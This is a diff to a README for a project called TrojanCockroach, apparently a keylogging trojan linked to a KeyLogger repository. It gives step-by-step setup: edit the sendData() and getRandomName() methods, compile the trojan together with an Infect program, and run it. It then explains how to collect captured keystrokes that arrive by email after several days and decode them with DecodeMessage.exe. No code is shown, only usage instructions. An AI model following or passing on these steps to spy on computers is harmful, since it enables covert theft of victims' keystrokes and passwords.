@@ -6,7 +6,7 @@
 
 ### Setup
 1. Preparation
-  1. Change **---()** and **---()** method of **TrojanCockroach.cpp** according to your wish.
+  1. Change **getRandomName()** and **sendData()** method of **TrojanCockroach.cpp** according to your wish.
   2. Compile **TrojanCockroach.cpp** & **Infect.cpp** (do not rename them).
   3. Place **TrojanCockroach.exe**, **Infect.exe**, **---**, **---** & **---** in the same folder.
   4. Now run **TrojanCockroach.exe**.
@@ -18,7 +18,7 @@
 
 3. Data Collection
   1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
-  2. After getting the email copy the full message to a text file. As the the message has come through email certain characters are converted. To resolve that ---.
+  2. After getting the email copy the full message to a text file. As the the message has come through email certain characters are converted. To resolve that --- --- ---.
   3. Now, run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
 
 You can get a more clear understanding of the project from its pre-project- **[KeyLogger](https://github.com/MinhasKamal/KeyLogger)**.
